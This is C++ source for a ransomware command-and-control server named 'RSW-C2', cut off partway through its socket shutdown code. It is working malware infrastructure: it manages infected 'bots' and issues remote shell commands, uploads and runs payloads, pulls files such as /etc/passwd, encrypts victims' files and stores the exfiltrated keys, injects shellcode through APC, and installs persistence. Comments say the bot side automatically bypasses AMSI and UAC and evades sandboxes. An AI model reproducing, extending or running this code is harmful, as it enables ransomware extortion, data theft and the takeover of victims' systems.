#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <iomanip>
#include <fstream>
#include <random>
#include <mutex>
#include <atomic>
#include <memory>   // shared_ptr — per-thread done-flag (shutdown UAF fix)
#include "crypto.h"   // ChaCha20-Poly1305 AEAD for transport encryption

#define CHUNK_SIZE 32768  // 32 KB chunks

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif


using namespace std;

struct ClientInfo {
    int socket;
    string ip;
    int port;
    string id;
    string bot_id;  // Bot ID (example: MAC_A1B2C3)
    bool authenticated;
    time_t last_seen;     // Last seen time
    time_t connected_at;  // Connection time
    // Added for proper server-client communication without race conditions
    string pending_response;   // Latest response received from the bot
    bool response_ready;       // True when a response from bot is available
    // Per-session encryption key (shared with client)
    unsigned char session_key[32];
    bool session_encryption;   // Encryption enabled flag

    ClientInfo() : authenticated(false), session_encryption(false) {
        memset(session_key, 0, 32);
    }
};

struct FileTransfer {
    string file_path;
    string transfer_id;
    size_t total_size;
    size_t total_chunks;
    size_t received_chunks;
    map<size_t, string> chunks;  // chunk_num -> hex_data
    bool is_upload;
    time_t start_time;
};

struct ScheduledTask {
    string task_id;
    string command;
    string schedule_time;  // Format: "HH:MM" or "*/5" (every 5 min)
    string target_bots;    // "all" or specific bot_id
    bool is_active;
    time_t next_run;
    time_t created_time;
    int run_count;

    ScheduledTask() : is_active(true), next_run(0), run_count(0) {
        created_time = time(nullptr);
    }
};

class RSW_C2 {
private:
    std::atomic<bool> listening;
    std::atomic<bool> running;
    std::mutex clients_mutex_;
    thread listener_thread;

    // SHUTDOWN UAF FIX: per-bot response threads are now TRACKED, not detached.
    // Detached threads can never be joined → after ~RSW_C2() destroyed this
    // object they could still touch connected_clients / clients_mutex_ / cout
    // (use-after-free = undefined behavior at shutdown). Each thread carries a
    // done-flag so finished ones can be reaped without waiting for shutdown.
    struct TrackedThread {
        thread t;
        shared_ptr<atomic<bool>> done;   // set to true when botResponseListener returns
    };
    std::mutex client_threads_mutex_;
    vector<TrackedThread> client_threads_;

    // Session Management
    bool in_session;
    string selected_bot_id;
    int selected_bot_socket;
    int server_port;
    int server_socket;
    vector<ClientInfo> connected_clients;
    map<string, string> command_help;
    map<string, string> command_details;
    map<string, FileTransfer> active_transfers;  // transfer_id -> FileTransfer
    time_t server_start_time;

    // Scheduler System
    map<string, ScheduledTask> scheduled_tasks;  // task_id -> ScheduledTask
    thread scheduler_thread;
    atomic<bool> scheduler_running;

    // Exfiltrated keys storage (received from bots via KEY_EXFIL)
    // map: bot_id -> vector of {file_path, key_info} pairs
    map<string, vector<pair<string, string>>> exfiltrated_keys;
    mutable std::mutex keys_mutex_;

    // RACE FIX: protects scheduled_tasks. The scheduler thread iterates the map
    // every 30s while UI commands (schedule / task-remove / task-toggle)
    // insert/erase concurrently. Without this lock an erase during iteration =
    // iterator invalidation = UB / crash (previously unsynchronized).
    std::mutex tasks_mutex_;

public:
    RSW_C2() : listening{false}, running{true}, in_session(false),
               selected_bot_socket(-1), server_port(8080), server_socket(-1), scheduler_running{false} {
        initializeCommands();
        server_start_time = time(nullptr);
        startScheduler();
        #ifdef _WIN32
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
        #endif
    }

    ~RSW_C2() {
        // Signal all background threads to stop BEFORE closing sockets
        scheduler_running = false;
        running = false;
        stopListening();   // stops accept loop, joins listener_thread

        // SHUTDOWN UAF FIX: join every per-bot response thread BEFORE this
        // object dies. joinClientThreads() shutdown()s their sockets first so
        // any recv() blocked in botResponseListener wakes up, prints the
        // disconnect line and returns → join() cannot hang.
        joinClientThreads();

        // Now that NO thread can touch connected_clients anymore, clear it.
        // (stopListening used to clear it while detached threads were still
        // iterating it — that was the actual UAF.)
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            connected_clients.clear();
        }

        // Wait for scheduler thread to exit cleanly (no use-after-free on scheduled_tasks)
        if (scheduler_thread.joinable()) {
            scheduler_thread.join();
        }

        #ifdef _WIN32
            WSACleanup();
        #endif
    }

    void initializeCommands() {
        command_help["help"] = "Show commands";
        command_help["exit"] = "Exit server";
        command_help["quit"] = "Exit server";
        command_help["clear"] = "Clear screen";
        command_help["bots"] = "List bots";
        command_help["status"] = "Show status";
        command_help["execute"] = "Run command";
        command_help["run"] = "Execute uploaded file";
        command_help["upload"] = "Upload file";
        command_help["download"] = "Download file";
        command_help["banner"] = "Show banner";
        command_help["av-check"] = "Check antivirus";
        command_help["firewall-check"] = "Check firewall";
        command_help["kill"] = "Kill/terminate bot process";
        command_help["show_key"] = "Show exfiltrated encryption keys";
        command_help["apc-inject"] = "APC Injection into process (Windows)";
        command_help["file-search"] = "Search files";
        command_help["file-delete"] = "Delete file";
        command_help["file-move"] = "Move file";
        command_help["dir-list"] = "List directory";
        command_help["exec-all"] = "Execute on all bots";
        command_help["select"] = "Select bot for session";
        command_help["session"] = "Show session info";
        command_help["back"] = "Exit session mode";
        command_help["schedule"] = "Schedule task";
        command_help["tasks"] = "List scheduled tasks";
        command_help["task-remove"] = "Remove scheduled task";
        command_help["task-toggle"] = "Enable/disable task";
        command_help["copy_id"] = "Copy bot ID to clipboard";
        command_help["encrypt"] = "Encrypt remote file";
        command_help["persistence"] = "Install persistence on bot";
        // AMSI and UAC bypasses are auto-executed by MWare.cpp after its initial
        // sandbox-evasion delay, not server-controlled.

        command_details["help"] =
            "📖 Help for 'help' command:\n"
            "  \033[1;31m•\033[0m Usage: help\n"
            "  \033[1;31m•\033[0m Description: Lists every command with a short summary.\n"
            "  \033[1;31m•\033[0m Tip: Append '?' (e.g., bots?) to see detailed help for a specific command.";

        command_details["bots"] =
            "📖 Help for 'bots' command:\n"
            "  \033[1;31m•\033[0m Usage: bots\n"
            "  \033[1;31m•\033[0m Description: Prints a table with \033[1;31mbot ID\033[0m, IP:PORT, auth status, last seen and uptime.\n"
            "  \033[1;31m•\033[0m Example: bots";

        command_details["status"] =
            "📖 Help for 'status' command:\n"
            "  • Usage: status\n"
            "  • Description: Shows listener address, uptime, active bot counts and OS distribution.\n"
            "  • Example: status";

        command_details["execute"] =
            "📖 Help for 'execute' command:\n"
            "  • Usage: execute <bot_id> <command>\n"
            "  • Description: Runs a shell command on the selected bot and streams the output.\n"
            "  • Examples:\n"
            "    execute MAC_A1B2C3 whoami\n"
            "    execute MAC_A1B2C3 ls -la";

        command_details["upload"] =
            "📖 Help for 'upload' command:\n"
            "  • Usage: upload <bot_id> <local_file> <remote_path>\n"
            "  • Description: Reads the local file, HEX encodes it and writes it to the bot.\n"
            "  • Examples:\n"
            "    upload MAC_A1B2C3 ./note.txt /tmp/note.txt\n"
            "    upload MAC_D3F4E5 ./payload.bin C:/Temp/payload.bin";

        command_details["download"] =
            "📖 Help for 'download' command:\n"
            "  • Usage: download <bot_id> <remote_file> <local_path>\n"
            "  • Description: Requests a remote file, receives HEX data and saves it locally.\n"
            "  • Examples:\n"
            "    download MAC_A1B2C3 /etc/passwd ./loot/passwd_copy\n"
            "    download WIN_DEAD90 C:/Temp/log.txt ./logs/log.txt";

        command_details["clear"] =
            "📖 Help for 'clear' command:\n"
            "  • Usage: clear\n"
            "  • Description: Clears the terminal screen and shows the banner again.";

        command_details["banner"] =
            "📖 Help for 'banner' command:\n"
            "  • Usage: banner\n"
            "  • Description: Reprints the ASCII banner without clearing the screen.";

        command_details["exit"] =
            "📖 Help for 'exit' command:\n"
            "  \033[1;31m•\033[0m Usage: exit\n"
            "  \033[1;31m•\033[0m Description: Gracefully shuts down RSW-C2 and closes all sockets.";
        command_details["quit"] = command_details["exit"];

        command_details["av-check"] =
            "📖 Help for 'av-check' command:\n"
            "  \033[1;31m•\033[0m Usage: av-check <bot_id>\n"
            "  \033[1;31m•\033[0m Description: Checks for running antivirus software on the target bot.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    av-check MAC_A1B2C3\n"
            "    av-check WIN_D4E5F6";

        command_details["firewall-check"] =
            "📖 Help for 'firewall-check' command:\n"
            "  \033[1;31m•\033[0m Usage: firewall-check <bot_id>\n"
            "  \033[1;31m•\033[0m Description: Checks firewall status and rules on the target bot.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    firewall-check MAC_A1B2C3\n"
            "    firewall-check WIN_D4E5F6";

        command_details["encrypt"] =
            "📖 Help for 'encrypt' command:\n"
            "  \033[1;31m•\033[0m Usage: encrypt <bot_id> <file_path>\n"
            "  \033[1;31m•\033[0m Description: Encrypts a specific file on the target bot remotely.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    encrypt MAC_A1B2C3 /Users/fatihemre/Desktop/secret.doc\n"
            "    encrypt WIN_D4E5F6 C:\\Users\\Admin\\Documents\\data.xlsx";

        command_details["show_key"] =
            "📖 Help for 'show_key' command:\n"
            "  \033[1;31m•\033[0m Usage: show_key [bot_id]\n"
            "  \033[1;31m•\033[0m Description: Lists all exfiltrated encryption keys received from bots. If bot_id is provided, shows only keys from that specific bot.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    show_key\n"
            "    show_key MAC_A1B2C3\n"
            "  \033[1;31m•\033[0m Note: Keys are automatically exfiltrated when a file is encrypted via ENCRYPT_FILE command.";

        command_details["kill"] =
            "📖 Help for 'kill' command:\n"
            "  \033[1;31m•\033[0m Usage: kill <bot_id>\n"
            "  \033[1;31m•\033[0m Description: Immediately terminates the bot process. No file cleanup.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    kill MAC_A1B2C3\n"
            "    kill WIN_D4E5F6";

        command_details["apc-inject"] =
            "📖 Help for 'apc-inject' command:\n"
            "  \033[1;31m•\033[0m Usage: apc-inject <bot_id> <process_name> <payload_data>\n"
            "  \033[1;31m•\033[0m Description: Injects payload into a process using APC Injection.\n"
            "  \033[1;31m•\033[0m Note: Windows only. Process must be running or will be started.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    apc-inject WIN_A1B2C3 notepad.exe <shellcode_hex>\n"
            "    apc-inject WIN_A1B2C3 explorer.exe <payload>";

        command_details["file-search"] =
            "📖 Help for 'file-search' command:\n"
            "  \033[1;31m•\033[0m Usage: file-search <bot_id> <pattern> [path]\n"
            "  \033[1;31m•\033[0m Description: Searches for files matching the pattern on the bot.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    file-search MAC_A1B2C3 *.txt\n"
            "    file-search WIN_D4E5F6 password* C:\\Users";

        command_details["file-delete"] =
            "📖 Help for 'file-delete' command:\n"
            "  \033[1;31m•\033[0m Usage: file-delete <bot_id> <file_path>\n"
            "  \033[1;31m•\033[0m Description: Deletes the specified file on the bot.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    file-delete MAC_A1B2C3 /tmp/evidence.txt\n"
            "    file-delete WIN_D4E5F6 C:\\Temp\\log.txt";

        command_details["file-move"] =
            "📖 Help for 'file-move' command:\n"
            "  \033[1;31m•\033[0m Usage: file-move <bot_id> <source> <destination>\n"
            "  \033[1;31m•\033[0m Description: Moves or renames a file on the bot.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    file-move MAC_A1B2C3 /tmp/old.txt /tmp/new.txt\n"
            "    file-move WIN_D4E5F6 C:\\file.txt D:\\backup\\file.txt";

        command_details["dir-list"] =
            "📖 Help for 'dir-list' command:\n"
            "  \033[1;31m•\033[0m Usage: dir-list <bot_id> [path]\n"
            "  \033[1;31m•\033[0m Description: Lists contents of the specified directory.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    dir-list MAC_A1B2C3\n"
            "    dir-list WIN_D4E5F6 C:\\Users";

        command_details["exec-all"] =
            "📖 Help for 'exec-all' command:\n"
            "  \033[1;31m•\033[0m Usage: exec-all <command>\n"
            "  \033[1;31m•\033[0m Description: Executes the same command on all connected and authenticated bots.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    exec-all whoami\n"
            "    exec-all ipconfig\n"
            "    exec-all ps aux";

        command_details["select"] =
            "📖 Help for 'select' command:\n"
            "  \033[1;31m•\033[0m Usage: select <bot_id>\n"
            "  \033[1;31m•\033[0m Description: Enters interactive session mode with the specified bot.\n"
            "  \033[1;31m•\033[0m Note: In session mode, commands are sent directly to the selected bot.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    select MAC_A1B2C3\n"
            "    select WIN_D4E5F6";

        command_details["session"] =
            "📖 Help for 'session' command:\n"
            "  \033[1;31m•\033[0m Usage: session\n"
            "  \033[1;31m•\033[0m Description: Shows current session information and selected bot details.\n"
            "  \033[1;31m•\033[0m Note: Only works when in session mode.";

        command_details["back"] =
            "📖 Help for 'back' command:\n"
            "  \033[1;31m•\033[0m Usage: back\n"
            "  \033[1;31m•\033[0m Description: Exits session mode and returns to main C2 interface.\n"
            "  \033[1;31m•\033[0m Aliases: exit (when in session mode)";

        command_details["schedule"] =
            "📖 Help for 'schedule' command:\n"
            "  \033[1;31m•\033[0m Usage: schedule <time> <target> <command>\n"
            "  \033[1;31m•\033[0m Time formats:\n"
            "    HH:MM - Daily at specific time (e.g., 14:30)\n"
            "    */N - Every N minutes (e.g., */5 for every 5 minutes)\n"
            "  \033[1;31m•\033[0m Target: 'all' for all bots or specific bot_id\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    schedule 09:00 all whoami\n"
            "    schedule */10 WIN_A1B2C3 ipconfig\n"
            "    schedule 23:59 all systeminfo";

        command_details["tasks"] =
            "📖 Help for 'tasks' command:\n"
            "  \033[1;31m•\033[0m Usage: tasks\n"
            "  \033[1;31m•\033[0m Description: Lists all scheduled tasks with their status and next run time.\n"
            "  \033[1;31m•\033[0m Shows: Task ID, Schedule, Target, Command, Status, Next Run, Run Count";

        command_details["task-remove"] =
            "📖 Help for 'task-remove' command:\n"
            "  \033[1;31m•\033[0m Usage: task-remove <task_id>\n"
            "  \033[1;31m•\033[0m Description: Permanently removes a scheduled task.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    task-remove TASK_001\n"
            "    task-remove daily_whoami";

        command_details["task-toggle"] =
            "📖 Help for 'task-toggle' command:\n"
            "  \033[1;31m•\033[0m Usage: task-toggle <task_id>\n"
            "  \033[1;31m•\033[0m Description: Enables or disables a scheduled task without removing it.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    task-toggle TASK_001\n"
            "    task-toggle daily_whoami";

        command_details["run"] =
            "📖 Help for 'run' command:\n"
            "  \033[1;31m•\033[0m Usage: run <bot_id> <file_path>\n"
            "  \033[1;31m•\033[0m Description: Executes an uploaded file on the target bot. Makes it executable (chmod +x) then runs it and returns output.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    run MAC_A1B2C3 /tmp/payload.sh\n"
            "    run WIN_D4E5F6 C:\\Temp\\uploaded.exe\n"
            "    run LNX_9A8B7C ./tool --flag arg\n"
            "  \033[1;31m•\033[0m Tip: Use 'upload' first to transfer the file, then 'run' to execute it.\n";

        command_details["copy_id"] =
            "📖 Help for 'copy_id' command:\n"
            "  \033[1;31m•\033[0m Usage: copy_id <Client_N>\n"
            "  \033[1;31m•\033[0m Description: Copies the bot ID of the specified client to clipboard.\n"
            "  \033[1;31m•\033[0m Tip: Run 'bots' first to see client numbers, then copy_id Client_1 to paste the ID.\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    copy_id Client_1\n"
            "    copy_id Client_2";

        command_details["persistence"] =
            "📖 Help for 'persistence' command:\n"
            "  \033[1;31m•\033[0m Usage: persistence <bot_id>\n"
            "  \033[1;31m•\033[0m Description: Installs persistence on the target bot. Uses Registry Run key (Windows), LaunchAgent plist (macOS), or .desktop autostart (Linux).\n"
            "  \033[1;31m•\033[0m Examples:\n"
            "    persistence MAC_A1B2C3\n"
            "    persistence WIN_D4E5F6";
        }

        // AMSI and UAC bypasses are auto-executed by MWare.cpp after its initial
        // sandbox-evasion delay. No server-side command needed.

    string trim(const string& text) {
        size_t start = text.find_first_not_of(" \t\n\r");
        if (start == string::npos) return "";
        size_t end = text.find_last_not_of(" \t\n\r");
        return text.substr(start, end - start + 1);
    }

    void showBanner() {
        cout << "\033[1;31m" << endl; // Red color
        cout << R"( ______    ______   __ __ __             ______   _____       )" << endl;
        cout << R"(/_____/\  /_____/\ /_//_//_/\           /_____/\ /_____/\     )" << endl;
        cout << R"(\:::_ \ \ \::::_\/_\:\\:\\:\ \   _______\:::__\/ \:::_:\ \    )" << endl;
        cout << R"( \:(_) ) )_\:\/___/\\:\\:\\:\ \ /______/\\:\ \  __   _\:\|    )" << endl;
        cout << R"(  \: __ `\ \ \_::._\:\:\\:\\:\ \\__::::\/ \:\ \/_/\ /::_/__   )" << endl;
        cout << R"(   \ \ `\ \ \ /____\:\\:\\:\\:\ \          \:\_\ \ \\:\____/\ )" << endl;
        cout << R"(    \_\/ \_\/ \_____\/ \_______\/           \_____\/ \_____\/ )" << endl;
        cout << R"(                                                              )" << endl;
        cout << R"(            Remote Controllable Ransomware Server             )" << endl;
        cout << "\033[0;34m" << R"(                      by Zer0 Crypt0                     )" << endl;
        cout << "\033[0m" << endl; // Reset color

        cout << "\033[1;36m"; // Cyan Color
        cout << "═══════════════════════════════════════════════════" << endl;
        cout << "\033[1;31m    RanSomWare C2 Server v1.0\033[0m" << endl; // Red color
        cout << "\033[1;36m    Type 'help' for available commands" << endl;
        cout << "═══════════════════════════════════════════════════" << endl;
        cout << "\033[0m" << endl;
    }

    void showHelp() {
        cout << "\n\033[1;37m══════════ COMMAND PALETTE ══════════\033[0m" << endl;
        cout << "\033[38;5;146m Tip:\033[0m Type \033[1mhelp?\033[0m or \033[1m<command>?\033[0m for cheat-sheets." << endl;
        cout << "\033[1;30m───────────────────────────────────────\033[0m" << endl;

        int entry = 0;
        for (const auto& cmd : command_help) {
            cout << "  \033[38;5;50m◆\033[0m \033[1;37m" << setw(14) << left << cmd.first << "\033[0m"
                 << " \033[2m" << cmd.second << "\033[0m" << endl;
            entry++;
            if (entry % 8 == 0) {
                cout << "  \033[38;5;240m──────────────────────────────────\033[0m" << endl;
            }
        }

        cout << "\033[1;30m───────────────────────────────────────\033[0m" << endl;
        cout << "\033[38;5;214mExamples:\033[0m  \033[1mbots?\033[0m  \033[1mexecute?\033[0m  \033[1mschedule?\033[0m" << endl;
        cout << "\033[38;5;117mShortcut:\033[0m  Press \033[1mTab\033[0m after typing a command to re-run the last input." << endl;
        cout << "\033[1;37m═══════════════════════════════════════\033[0m\n" << endl;
    }

    void showCommandDetails(const string& command) {
        auto it = command_details.find(command);
        if (it == command_details.end()) {
            cout << "\033[1;31mNo detailed help for command: " << command << "\033[0m" << endl;
            return;
        }

        const string& details = it->second;

        cout << "\n\033[1;37m──────────── COMMAND HELP ────────────\033[0m" << endl;
        cout << "\033[1;35m Command:\033[0m " << command
             << "    \033[2m(Type '" << command << "?' anytime to reopen)\033[0m" << endl;
        cout << "\033[1;30m────────────────────────────────────────\033[0m" << endl;

        istringstream iss(details);
        string line;
        while (getline(iss, line)) {
            string trimmed = trim(line);
            if (trimmed.empty()) {
                cout << endl;
                continue;
            }

            string color = "\033[1;36m";
            if (trimmed.find("Usage:") != string::npos) {
                color = "\033[38;5;39m";
            }
            else if (trimmed.find("Description:") != string::npos) {
                color = "\033[38;5;220m";
            }
            else if (trimmed.find("Note:") != string::npos || trimmed.find("Tip:") != string::npos) {
                color = "\033[38;5;244m";
            }
            else if (trimmed.find("Example") != string::npos || trimmed.find("Examples") != string::npos) {
                color = "\033[38;5;84m";
            }

            cout << color << line << "\033[0m" << endl;
        }

        cout << "\n\033[38;5;208mTip:\033[0m Combine with session mode (e.g., "
             << "\033[1mselect BOT_ID\033[0m → \033[1msession?\033[0m) for context-aware hints." << endl;
        cout << "\033[1;30m────────────────────────────────────────\033[0m" << endl;
        cout << "\033[1;37m────────────────────────────────────────\033[0m\n" << endl;
    }

    void clearScreen() {
        // ANSI escape codes for clearing screen and moving cursor to top
        cout << "\033[2J\033[H";
        cout.flush();

        // Also use system clear as backup
        #ifdef _WIN32
            system("cls");
        #else
            system("clear");
        #endif
    }

    string formatTime(time_t timestamp) {
        time_t now = time(nullptr);
        int diff = (int)(now - timestamp);

        if (diff < 60) return to_string(diff) + "s ago";
        if (diff < 3600) return to_string(diff/60) + "m ago";
        if (diff < 86400) return to_string(diff/3600) + "h ago";
        return to_string(diff/86400) + "d ago";
    }

    // HEX encoding/decoding functions
    string bytesToHex(const string& data) {
        string hex_string;
        hex_string.reserve(data.length() * 2);

        for (unsigned char c : data) {
            hex_string += "0123456789ABCDEF"[c >> 4];
            hex_string += "0123456789ABCDEF"[c & 0x0F];
        }
        return hex_string;
    }

    string hexToBytes(const string& hex) {
        string bytes;
        bytes.reserve(hex.length() / 2);

        for (size_t i = 0; i < hex.length(); i += 2) {
            string byte_string = hex.substr(i, 2);
            unsigned char byte = (unsigned char)strtol(byte_string.c_str(), nullptr, 16);
            bytes.push_back(byte);
        }
        return bytes;
    }

    // Per-client transport encryption — ChaCha20-Poly1305 AEAD
    // Each message: nonce(12) || ciphertext || Poly1305-tag(16)
    string encryptForClient(const ClientInfo& client, const string& data) {
        if (!client.session_encryption) return data;

        // Generate random 12-byte nonce for AEAD (explicit nonce per message)
        uint8_t nonce[12];
        random_device rd;
        for (int i = 0; i < 12; i++) nonce[i] = (uint8_t)(rd() & 0xFF);

        // Encrypt with ChaCha20-Poly1305 AEAD (confidentiality + integrity)
        vector<uint8_t> plaintext(data.begin(), data.end());
        vector<uint8_t> aead = chacha20Poly1305Encrypt(plaintext, client.session_key, nonce);

        // Prepend nonce so receiver can decrypt: nonce(12) || ciphertext || tag(16)
        string result;
        result.reserve(12 + aead.size());
        result.append((char*)nonce, 12);
        result.append((char*)aead.data(), aead.size());
        return result;
    }

    string decryptFromClient(const ClientInfo& client, const string& data) {
        if (!client.session_encryption) return data;

        // Minimum: 12-byte nonce + 16-byte Poly1305 tag = 28 bytes
        if (data.length() < 28) return "";

        // Extract nonce from first 12 bytes
        const uint8_t* nonce = (const uint8_t*)data.data();

        // Extract AEAD ciphertext+tag from remaining bytes
        vector<uint8_t> aead(data.begin() + 12, data.end());

        // Decrypt + verify with ChaCha20-Poly1305 AEAD
        vector<uint8_t> plaintext = chacha20Poly1305Decrypt(aead, client.session_key, nonce);

        // Empty result = MAC verification failed (tampered or corrupted)
        if (plaintext.empty()) return "";

        return string((char*)plaintext.data(), plaintext.size());
    }

    // Wrap/unwrap transport protocol (matches client)
    string wrapForTransport(const string& data) {
        string wrapped;
        size_t length = data.length();

        wrapped += (char)((length >> 24) & 0xFF);
        wrapped += (char)((length >> 16) & 0xFF);
        wrapped += (char)((length >> 8) & 0xFF);
        wrapped += (char)(length & 0xFF);

        unsigned char checksum = 0;
        for (char c : data) {
            checksum ^= (unsigned char)c;
        }
        wrapped += (char)checksum;
        wrapped += data;

        return wrapped;
    }

    string unwrapFromTransport(const string& data) {
        if (data.length() < 5) return data;

        size_t length = ((unsigned char)data[0] << 24) |
                       ((unsigned char)data[1] << 16) |
                       ((unsigned char)data[2] << 8) |
                       ((unsigned char)data[3]);

        // 256MB cap — must exceed any legitimate frame (32KB chunk uploads
        // hex-encode to >64KB, which the old 65536 cap truncated).
        if (length > 0x0FFFFFFF || length > data.length() - 5) {
            return data;
        }

        string extracted = data.substr(5, length);
        unsigned char checksum = (unsigned char)data[4];

        unsigned char calc_checksum = 0;
        for (char c : extracted) {
            calc_checksum ^= (unsigned char)c;
        }

        if (calc_checksum == checksum) {
            return extracted;
        }

        return data;
    }

    // Send encrypted command to client — framed (4-byte BE length + encrypted
    // payload) with a send-loop. The plaintext length prefix lets the bot
    // reassemble frames that TCP splits, and the loop guarantees large frames
    // (32KB chunked uploads hex-encoded to ~65KB) are fully written.
    bool sendEncryptedCommand(ClientInfo& client, const string& data) {
        string wrapped = wrapForTransport(data);
        string encrypted = encryptForClient(client, wrapped);
        if (encrypted.length() > 0x0FFFFFFF) return false;  // sanity: < 256MB

        string frame;
        frame.reserve(4 + encrypted.length());
        frame += (char)((encrypted.length() >> 24) & 0xFF);
        frame += (char)((encrypted.length() >> 16) & 0xFF);
        frame += (char)((encrypted.length() >> 8) & 0xFF);
        frame += (char)(encrypted.length() & 0xFF);
        frame += encrypted;

        size_t sent = 0;
        while (sent < frame.length()) {
            int n = send(client.socket, frame.c_str() + sent, (int)(frame.length() - sent), 0);
            if (n <= 0) return false;
            sent += (size_t)n;
        }
        return true;
    }

    // File operations
    string readFileToHex(const string& filepath) {
        ifstream file(filepath, ios::binary);
        if (!file.is_open()) {
            return "";
        }

        string content((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
        file.close();

        return bytesToHex(content);
    }

    bool writeHexToFile(const string& hex_data, const string& filepath) {
        string binary_data = hexToBytes(hex_data);

        ofstream file(filepath, ios::binary);
        if (!file.is_open()) {
            return false;
        }

        file.write(binary_data.c_str(), binary_data.length());
        file.close();

        return true;
    }

    string centerText(const string& text, int width) {
        int padding = (width - (int)text.length()) / 2;
        if (padding < 0) padding = 0;
        return string(padding, ' ') + text + string(width - padding - (int)text.length(), ' ');
    }

    void listClients() {
        // ========================================================================
        // RACE CONDITION FIX: Do NOT erase unauthenticated clients here!
        //
        // botResponseListener thread performs authentication OUTSIDE the mutex
        // (recv BOT_CONNECT). If we erase a client whose auth
        // hasn't completed yet, the botResponseListener can never find it in
        // connected_clients to set authenticated=true → zombie TCP connection.
        //
        // Instead, we just SKIP unauthenticated clients in the display loop.
        // Cleanup happens naturally when botResponseListener exits (sets
        // authenticated=false + closes socket).
        // ========================================================================

        cout << "\033[1;32m"; // Green color
        cout << "═══════════════════════════════════════════════════════════" << endl;
        cout << "                   CONNECTED BOTS" << endl;
        cout << "═══════════════════════════════════════════════════════════" << endl;
        cout << "\033[0m";

        // Count authenticated clients first (thread-safe snapshot)
        int auth_count = 0;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (const auto& c : connected_clients) {
                if (c.authenticated) auth_count++;
            }
        }

        if (auth_count == 0) {
            cout << "\033[1;31m  No bots connected.\033[0m" << endl;
        } else {
            int client_num = 1;
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (const auto& client : connected_clients) {
                if (!client.authenticated) continue;  // Skip in-auth or disconnected
                cout << "\033[1;36m" << endl;
                cout << "Client_" << client_num << ":" << endl;
                cout << "  \033[1;37mID   : \033[1;33m" << client.bot_id << endl;
                cout << "  \033[1;37mIP   : \033[1;36m" << client.ip << endl;
                cout << "  \033[1;37mPort : \033[1;35m" << client.port << "\033[0m" << endl;
                client_num++;
            }
        }
        cout << "\033[1;32m═══════════════════════════════════════════════════════════\033[0m" << endl;
    }

    void showStatus() {
        cout << "\033[1;36m"; // Cyan color
        cout << "Server Status:" << endl;
        cout << "═══════════════════════════════════════════════════" << endl;

        // Server info
        cout << "\033[1;37m"; // White
        cout << "Server Address: \033[1;32m0.0.0.0:" << server_port << "\033[1;37m" << endl;
        cout << "Status: " << (listening ? "\033[1;32mLISTENING\033[1;37m" : "\033[1;31mSTOPPED\033[1;37m") << endl;
        cout << "Uptime: \033[1;33m" << formatTime(server_start_time) << "\033[1;37m" << endl;

        // Bot statistics (thread-safe)
        int online_bots = 0;
        int total_bots = 0;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (const auto& client : connected_clients) {
                if (client.authenticated) { online_bots++; total_bots++; }
                else if (client.bot_id != "UNKNOWN") total_bots++;  // was once authenticated
            }
        }

        cout << "Connected Bots: \033[1;32m" << online_bots << "\033[1;37m / \033[1;33m" << total_bots << "\033[1;37m" << endl;

        // OS breakdown (thread-safe)
        map<string, int> os_count;
        {
            std::lock_guard<std::mutex> lock(clients_mutex_);
            for (const auto& client : connected_clients) {
                if (client.authenticated) {
                    string os = client.bot_id.substr(0, 3);
                    os_count[os]++;
                }
            }
        }
        if (!os_count.empty()) {
            cout << "OS Distribution: ";
            bool first = true;
            for (const auto& os : os_count) {
                if (!first) cout << ", ";
                cout << "\033[1;35m" << os.first << "\033[1;37m: \033[1;32m" << os.second << "\033[1;37m";
                first = false;
            }
            cout << endl;
        }

        cout << "\033[0m" << endl;
    }

    void startListening() {
        if (listening) {
            cout << "\033[1;33mServer is already listening on port " << server_port << "\033[0m" << endl;
            return;
        }

        server_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (server_socket < 0) {
            cout << "\033[1;31mFailed to create socket!\033[0m" << endl;
            return;
        }

        int opt = 1;
        setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0
        server_addr.sin_port = htons(server_port);

        if (::bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            #ifdef _WIN32
                closesocket(server_socket);
            #else
                close(server_socket);
            #endif
            return;
        }

        if (listen(server_socket, 5) < 0) {
            cout << "\033[1;31mFailed to listen on socket!\033[0m" << endl;
            return;
        }

        listening = true;
        cout << "\033[1;32m[+] Server listening on 0.0.0.0:" << server_port << "\033[0m" << endl;

        // Start listener thread (joined in stopListening)
        listener_thread = thread(&RSW_C2::acceptConnections, this);
    }

    void stopListening() {
        if (!listening) return;

        listening = false;
        if (server_socket >= 0) {
            // SHUTDOWN HANG FIX: close() alone does NOT wake a thread blocked
            // in accept() (macOS/Linux) — the listener_thread join() below then
            // hangs forever. shutdown() first so accept() returns immediately.
            #ifdef _WIN32
                shutdown(server_socket, SD_BOTH);
                closesocket(server_socket);
            #else
                shutdown(server_socket, SHUT_RDWR);
                close(server_socket);
